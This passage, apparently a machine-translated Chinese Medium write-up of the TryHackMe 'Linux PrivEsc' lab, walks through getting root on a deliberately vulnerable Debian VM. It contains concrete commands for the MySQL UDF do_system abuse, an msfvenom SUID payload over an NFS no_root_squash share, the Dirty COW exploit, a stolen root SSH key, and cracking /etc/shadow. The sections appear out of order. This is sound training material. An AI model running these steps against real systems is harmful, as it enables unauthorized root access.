class="ky ir">的隐藏目录。宋承宪</strong>。查看目录的内容:</p><p id="8d88" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">ls -l /.ssh</code></p><p id="3d22" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">注意，有一个全球可读的文件叫做<strong class="ky ir"> root_key </strong>。对该文件的进一步检查应该表明它是一个私有SSH密钥。该文件的名称表明它是为root用户准备的。</p><p id="e8a8" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">将密钥复制到您的Kali框中(只查看<strong class="ky ir"> root_key </strong>文件的内容并复制/粘贴密钥会更容易),并赋予它正确的权限，否则您的SSH客户端将拒绝使用它:</p><p id="59fd" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">chmod 600 root_key</code></p><p id="c8ce" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">使用密钥作为根帐户登录Debian虚拟机(相应地更改IP):</p><p id="c742" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">ssh -i root_key root@10.10.10.10</code></p><p id="4857" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">记得在继续之前退出根shell！</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pn"><img src="../Images/defd24ce80652b0da3bc0c9d4a82253a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1190/format:webp/1*Z58m9xixlZsseItxACj_xw.png"/></div></figure><p id="c51e" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">将密钥复制到kali linux</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi po"><img src="../Images/ef3ea35ef1299b88fa4031464b8caf50.png" data-original-src="https://miro.medium.com/v2/resize:fit:1326/format:webp/1*sGnRP_fBLWhpAXVrfHQ1oQ.png"/></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pp"><img src="../Images/9c3e1f83e87b3bf0721fb3ecdaf8d9a1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LrF1J4oPlDN7vvWsDLPhSw.png"/></div></div></figure><h1 id="a834" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务19 — NFS</h1><p id="eab5" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">通过NFS创建的文件继承了<strong class="ky ir">远程</strong>用户的ID。如果用户是root，并且启用了root squashing，则ID将改为设置为“nobody”用户。</p><p id="adda" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">检查Debian虚拟机上的NFS共享配置:</p><p id="704d" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">在服务器上</strong></p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="9bf2" class="nf lt iq ms b gy ng nh l ni nj">cat /etc/exports</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pq"><img src="../Images/421da6b01a045576110a7207be2dce12.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NJyZNXPkS_FkIssbJa9-1g.png"/></div></div></figure><p id="6900" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">请注意，<strong class="ky ir"> /tmp </strong>共享禁用了根挤压。</p><p id="3b66" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在您的Kali机器上，如果您还没有以root用户身份运行，请切换到root用户:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="d1f3" class="nf lt iq ms b gy ng nh l ni nj">sudo su</span></pre><p id="71c4" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">使用Kali的root用户，在您的Kali机器上创建一个挂载点，并挂载<strong class="ky ir"> /tmp </strong>共享(相应地更新IP):</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="06f1" class="nf lt iq ms b gy ng nh l ni nj">mkdir /tmp/nfs<br/>mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs</span></pre><p id="d220" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">仍然使用Kali的root用户，使用<strong class="ky ir"> msfvenom </strong>生成一个有效负载，并保存到挂载的共享中(这个有效负载简单地调用/bin/bash):</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="58ab" class="nf lt iq ms b gy ng nh l ni nj">msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf</span></pre><p id="c391" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">仍然使用Kali的根用户，使文件可执行，并设置SUID权限:</p><p id="01d8" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">工作站上的</strong></p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="869c" class="nf lt iq ms b gy ng nh l ni nj">chmod +xs /tmp/nfs/shell.elf</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pr"><img src="../Images/2dc58d1729a32b5d0cc44cd5da7035ab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*eVsgYZmCdQbGVuzAc0WXKg.png"/></div></div></figure><p id="5fd1" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">回到Debian VM，作为低特权用户帐户，执行文件以获得根shell:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="edf2" class="nf lt iq ms b gy ng nh l ni nj">/tmp/shell.elf</span></pre><p id="ed98" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">记得在继续之前退出根shell！</strong></p><p id="8cce" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">服务器上的</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ps"><img src="../Images/148138857152df8130a4f9a9706fe61f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*PjRy3dFMhSy3z_KgYSBhQw.png"/></div></div></figure><p id="4bf8" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">问题1: </strong>禁用根挤压的选项叫什么？</p><blockquote class="mu mv mw"><p id="25eb" class="kw kx mx ky b kz la jr lb lc ld ju le my lg lh li mz lk ll lm na lo lp lq lr ij bi translated"><strong class="ky ir"> <em class="iq">答案:no_root_squash </em> </strong></p></blockquote><h1 id="ba61" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务20:内核漏洞</h1><p id="aab3" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">内核漏洞可能会使系统处于不稳定状态，这就是为什么您应该只在万不得已时才运行它们。</p><p id="c4f6" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">运行<strong class="ky ir"> Linux漏洞利用建议器2 </strong>工具，识别当前系统上潜在的内核漏洞利用:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="796b" class="nf lt iq ms b gy ng nh l ni nj">perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl</span></pre><p id="4cec" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">应该列出流行的Linux内核漏洞“Dirty COW”。Dirty COW的漏洞利用代码可以在<strong class="ky ir">/home/user/tools/kernel-exploits/Dirty COW/c0w . c</strong>找到。它将SUID文件/usr/bin/passwd替换为一个生成shell的文件(在/tmp/bak中创建了/usr/bin/passwd的备份)。</p><p id="64ac" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">编译并运行代码(注意，可能需要几分钟才能完成):</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="dd2d" class="nf lt iq ms b gy ng nh l ni nj">gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w<br/>./c0w</span></pre><p id="ac79" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">一旦攻击完成，运行/usr/bin/passwd获得根外壳:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="b0b3" class="nf lt iq ms b gy ng nh l ni nj">/usr/bin/passwd</span></pre><p id="7451" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">记得在继续之前恢复原始的/usr/bin/passwd文件并退出根shell！</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="14c5" class="nf lt iq ms b gy ng nh l ni nj">mv /tmp/bak /usr/bin/passwd<br/>exit</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pt"><img src="../Images/0cd713b1bd5d74b05e77e4451e0a09a1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*VQQ3ZRCQhwi8wMW4iG41zA.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pu"><img src="../Images/c882f2fb165e7caae835cc101b49188b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CRdmHNJuLDJVM7HrYKoDxA.png"/></div></div></figure><p id="453a" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">你可以在:<br/><strong class="ky ir">LinkedIn:-</strong><a class="ae kv" href="https://www.linkedin.com/in/shamsher-khan-651a35162/" rel="noopener ugc nofollow" target="_blank">https://www.linkedin.com/in/shamsher-khan-651a35162/</a><br/><strong class="ky ir">Twitter:-</strong><a class="ae kv" href="https://twitter.com/shamsherkhannn" rel="noopener ugc nofollow" target="_blank">https://twitter.com/shamsherkhannn</a><br/><strong class="ky ir">Tryhackme:-</strong><a class="ae kv" href="https://tryhackme.com/p/Shamsher" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/p/Shamsher</a></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pv"><img src="../Images/09e5bbba06c7688a702aeec8570d243c.png" data-original-src="https://miro.medium.com/v2/resize:fit:854/format:webp/1*Vve7XR6kstH7qA5iQQ-kYA.png"/></div></figure><p id="671c" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">如需更多演练，请在出发前继续关注…<br/>…</p><p id="a5a9" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">访问我的其他演练:-</p><div class="pw px gp gr py pz"><a href="https://shamsher-khan.medium.com/dns-manipulation-tryhackme-writeup-931b06ef02cd" rel="noopener follow" target="_blank"><div class="qa ab fo"><div class="qb ab qc cl cj qd"><h2 class="bd ir gy z fp qe fr fs qf fu fw ip bi translated">DNS操纵尝试黑客技术</h2><div class="qg l"><h3 class="bd b gy z fp qe fr fs qf fu fw dk translated">这是一篇关于Tryhackme room“DNS操纵”的文章</h3></div><div class="qh l"><p class="bd b dl z fp qe fr fs qf fu fw dk translated">shamsher-khan.medium.com</p></div></div><div class="qi l"><div class="qj l qk ql qm qi qn kp pz"/></div></div></a></div><div class="pw px gp gr py pz"><a href="https://link.medium.com/DNfhWzmtveb" rel="noopener follow" target="_blank"><div class="qa ab fo"><div class="qb ab qc cl cj qd"><h2 class="bd ir gy z fp qe fr fs qf fu fw ip bi translated">Wekor Tryhackme报道</h2><div class="qg l"><h3 class="bd b gy z fp qe fr fs qf fu fw dk translated">作者Shamsher khan这是一篇关于Tryhackme room“Wekor”的文章</h3></div><div class="qh l"><p class="bd b dl z fp qe fr fs qf fu fw dk translated">link.medium.com</p></div></div><div class="qi l"><div class="qo l qk ql qm qi qn kp pz"/></div></div></a></div><div class="pw px gp gr py pz"><a href="https://link.medium.com/mKGmn0Ztpeb" rel="noopener follow" target="_blank"><div class="qa ab fo"><div class="qb ab qc cl cj qd"><h2 class="bd ir gy z fp qe fr fs qf fu fw ip bi translated">团队Tryhackme记录</h2><div class="qg l"><h3 class="bd b gy z fp qe fr fs qf fu fw dk translated">由沙姆谢尔汗这是一个Tryhackme室“团队”Tryhackme写</h3></div><div class="qh l"><p class="bd b dl z fp qe fr fs qf fu fw dk translated">link.medium.com</p></div></div><div class="qi l"><div class="qp l qk ql qm qi qn kp pz"/></div></div></a></div><p id="84d1" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">感谢您花时间阅读我的演练。<br/>如果你觉得有用，请点击👏按钮👏(高达40倍)并分享<br/>它来帮助其他有类似兴趣的人！+随时欢迎反馈！Linux PrivEsc Tryhackme文章</p><h2 id="816f" class="nf lt iq bd lu qq qr dn ly qs qt dp mc lf qu qv me lj qw qx mg ln qy qz mi ra bi translated">作者Shamsher khan这是一篇关于Tryhackme room“JLinux PrivEsc”的文章</h2><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi kf"><img src="../Images/60884009c17181dbbebfb9e0647cee22.png" data-original-src="https://miro.medium.com/v2/resize:fit:976/format:webp/1*-jIMBWfsedCUSu0cLVlkBw.png"/></div></div><figcaption class="kr ks gj gh gi kt ku bd b be z dk translated"><a class="ae kv" href="https://tryhackme.com/room/linuxprivesc" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/linuxprivesc</a></figcaption></figure><p id="fd8c" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">房间链接:</strong><a class="ae kv" href="https://tryhackme.com/room/linuxprivesc" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/linuxprivesc</a><br/><strong class="ky ir">注:此房免费</strong></p><h1 id="8a8b" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务1:部署易受攻击的Debian虚拟机</h1><p id="94a8" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">这个房间旨在向您介绍各种Linux权限提升技术。要做到这一点，您必须首先部署一个故意易受攻击的Debian VM。这个虚拟机是萨基·沙哈尔创建的，作为他的<a class="ae kv" href="https://github.com/sagishahar/lpeworkshop" rel="noopener ugc nofollow" target="_blank"><strong class="ky ir"/></a>本地权限提升研讨会的一部分，但是已经被<a class="ae kv" href="https://twitter.com/TibSec" rel="noopener ugc nofollow" target="_blank"> Tib3rius </a>更新，作为他的<a class="ae kv" href="https://www.udemy.com/course/linux-privilege-escalation/?referralCode=0B0B7AA1E52B4B7F4C06" rel="noopener ugc nofollow" target="_blank"><strong class="ky ir">OSCP及更远地区的Linux权限提升的一部分！</strong></a>Udemy上的课程。这里提供了对本会议室中使用的各种技术的完整解释，以及在Linux中查找权限提升的演示和提示。</p><p id="a745" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">在尝试访问Debian虚拟机之前，请确保您已连接到</strong><a class="ae kv" href="https://tryhackme.com/access" rel="noopener ugc nofollow" target="_blank"><strong class="ky ir">TryHackMe VPN</strong></a><strong class="ky ir">或使用浏览器内Kali实例！</strong></p><p id="a1b6" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">SSH应该在端口22上可用。您可以使用以下命令登录到“用户”帐户:</p><p id="1e90" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">ssh user@10.10.25.177</code></p><p id="d95d" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">如果您看到以下消息:“您确定要继续连接吗(是/否)？”键入<strong class="ky ir"> yes </strong>并按下<strong class="ky ir">进入</strong>。</p><p id="1218" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">“用户”帐户的密码是“<strong class="ky ir"> password321 </strong>”。</p><p id="58da" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">接下来的任务将带您了解不同的权限提升技术。在每个技术之后，你应该有一个根壳。<strong class="ky ir">在开始下一个任务之前，记得退出shell和/或作为“用户”帐户重新建立一个会话！</strong></p><p id="9316" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">部署机器并使用SSH登录到“用户”帐户。</p><p id="85bb" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">问1: </strong>运行“id”命令。结果如何呢？</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mt"><img src="../Images/cbee1f94095a8e8c3d66c2fbcb3401e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2ux8tWQXVJrSLMuGz5hIDw.png"/></div></div></figure><blockquote class="mu mv mw"><p id="a334" class="kw kx mx ky b kz la jr lb lc ld ju le my lg lh li mz lk ll lm na lo lp lq lr ij bi translated"><strong class="ky ir">答案:uid=1000(用户)gid=1000(用户)groups=1000(用户)，24(cdrom)，25(软盘)，29(音频)，30(dip)，44(视频)，46(plugdev) </strong></p></blockquote><h1 id="b5b9" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务2:服务利用</h1><p id="bf36" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">MySQL服务以root用户身份运行，并且该服务的“root”用户没有分配密码。我们可以使用<a class="ae kv" href="https://www.exploit-db.com/exploits/1518" rel="noopener ugc nofollow" target="_blank">流行的漏洞</a>，它利用用户定义函数(UDF)通过MySQL服务以root用户身份运行系统命令。</p><p id="2e8b" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">转到/home/user/tools/mysql-udf目录:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="b76c" class="nf lt iq ms b gy ng nh l ni nj">cd /home/user/tools/mysql-udf</span></pre><p id="b442" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">使用以下命令编译raptor_udf2.c漏洞利用代码:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nk"><img src="../Images/1025fc967f4b7c9f34012582c4068f95.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zk4TzqMJrY96AqLtcw7lww.png"/></div></div></figure><p id="6d81" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">以root用户身份使用空白密码连接到MySQL服务:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="c1e9" class="nf lt iq ms b gy ng nh l ni nj">mysql -u root</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nl"><img src="../Images/c6c8c1b8bfebd7f2a3f228f27af520c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*T7rgafaZV2MDgnhsjB0TgA.png"/></div></div></figure><p id="9087" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在MySQL shell上执行以下命令，使用我们编译的漏洞创建一个用户定义的函数(UDF)“do _ system”:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nm"><img src="../Images/43875acf4686ed4a3e27b56c488b02ed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lmNC7l1KckZxBONqMmBt4g.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nn"><img src="../Images/15552c04aff427e4232e07dbbe081ab0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jif01N3AZfxmYXqhDAX8zA.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi no"><img src="../Images/c7dce3b166bd0401267d5dc1b16ff37c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YYImvNFDBoekkMnIn97SUg.png"/></div></div></figure><p id="32af" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">使用函数将/bin/bash复制到/tmp/rootbash，并设置SUID权限:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="025f" class="nf lt iq ms b gy ng nh l ni nj">select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');</span></pre><p id="a0e9" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">退出MySQL shell(键入<strong class="ky ir"> exit </strong>或<strong class="ky ir"> \q </strong>并按<strong class="ky ir"> Enter </strong>)并使用-p运行/tmp/rootbash可执行文件以获得以root权限运行的shell:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="43f6" class="nf lt iq ms b gy ng nh l ni nj">/tmp/rootbash -p</span></pre><p id="3230" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">记得在继续之前删除/tmp/rootbash可执行文件并退出根shell，因为您稍后将在房间中再次创建该文件！</strong></p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="7799" class="nf lt iq ms b gy ng nh l ni nj">rm /tmp/rootbash<br/>exit</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi mt"><img src="../Images/90bfc13104286a211fbab38e78b2410f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ChnJTEcfwbSmkflOTkjwxA.png"/></div></div></figure><h1 id="0ae7" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务3:弱文件权限-可读/etc/shadow</h1><p id="8cfe" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated"><strong class="ky ir">问1: </strong> <strong class="ky ir">什么是root用户的密码hash？</strong></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi np"><img src="../Images/e04e9dfee1703178d368fabde4655b8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HDbXtQnREtMC_wCz19kuEA.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi nq"><img src="../Images/ccd202b9e39e2e477f74f8d645c4c8b1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*g34nwBBAoKk3WvwHtQZoag.png"/></div></div></figure><p id="4d02" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">正如我们所看到的，root和user的哈希是暴露的，可以离线破解！</p><p id="3ac6" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">问题2:使用了什么哈希算法来生成根用户的密码哈希？</strong></p><p id="eb54" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">密码的格式为<code class="fe mp mq mr ms b">$id$salt$hash</code>，id的可能值为:</p><ul class=""><li id="3383" class="nr ns iq ky b kz la lc ld lf nt lj nu ln nv lr nw nx ny nz bi translated"><code class="fe mp mq mr ms b">$1$</code> : MD5</li><li id="9650" class="nr ns iq ky b kz oa lc ob lf oc lj od ln oe lr nw nx ny nz bi translated"><code class="fe mp mq mr ms b">$2$</code>:河豚</li><li id="fce7" class="nr ns iq ky b kz oa lc ob lf oc lj od ln oe lr nw nx ny nz bi translated"><code class="fe mp mq mr ms b">$3$</code>:河豚</li><li id="83f8" class="nr ns iq ky b kz oa lc ob lf oc lj od ln oe lr nw nx ny nz bi translated"><code class="fe mp mq mr ms b">$5$</code> : SHA256</li><li id="67e2" class="nr ns iq ky b kz oa lc ob lf oc lj od ln oe lr nw nx ny nz bi translated"><code class="fe mp mq mr ms b">$6$</code> : SHA512</li></ul><p id="65b4" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">$6$</code>为SHA512。开膛手约翰会给出这个信息。</p><p id="de19" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">我们可以使用另一个名为“hashid”的工具来确定哈希类型。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi of"><img src="../Images/89dd1489f22d65967b1740d77b9b7501.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nFFUtFq807u70dSW8xdliQ.png"/></div></div></figure><p id="325f" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">问root用户的密码是什么？</strong></p><p id="4cca" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">我们可以使用开膛手约翰破解密码，这也告诉我们使用的哈希算法。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi og"><img src="../Images/b52046dc95e2622c3e7285bd7736e279.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9akAsq58fZNy7gZsS8vjmw.png"/></div></div></figure><h1 id="8f56" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务4:弱文件权限-可写/etc/shadow</h1><p id="dfe6" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">虚拟机上的/etc/shadow文件不仅是全局可读的，而且是全局可写的。这可能会被滥用，方法是将root的哈希改为一个我们知道明文密码的新哈希。</p><p id="4358" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">“mkpasswd”实用程序用于创建新的sha-512密码。使用vim替换root的新散列。</p><figure class="kg kh 